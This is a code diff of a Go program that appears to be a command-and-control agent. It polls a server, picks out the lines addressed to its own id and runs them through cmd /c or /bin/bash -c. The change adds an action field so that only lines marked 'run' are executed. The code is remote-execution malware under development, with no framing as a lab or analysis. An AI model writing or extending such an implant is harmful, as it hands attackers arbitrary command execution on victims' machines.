@@ -16,7 +16,7 @@ import (
 
 func main() {
 id := os.Args[1]
-data := "Hello From Agent "+ id +" Go"
+data := "Hello From Agent "+ id +" (Go)"
 sEnc := b64.StdEncoding.EncodeToString([]byte(data))
 
 
@@ -52,12 +52,15 @@ cmds := string(resBody)
 
 for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       if strings.Contains(string(line), string(id)){
+      act:= strings.Split(line, ":")[1]
+     
+      if act == "run"{
       fmt.Println(line)
       var syscmd string
       var sysparam string
       syscmd = "cmd"
       sysparam = "/c"
-      cmdline := strings.Join(strings.Split(line, ":")[1:], ":")
+      cmdline := strings.Join(strings.Split(line, ":")[2:], ":")
       if string(os.PathSeparator) == "/" {
       syscmd = "/bin/bash"
       sysparam = "-c"
@@ -75,6 +78,7 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
 	}
       fmt.Println(gimme)	
       }
+}
       }
 
 time.Sleep(10 * time.Second)
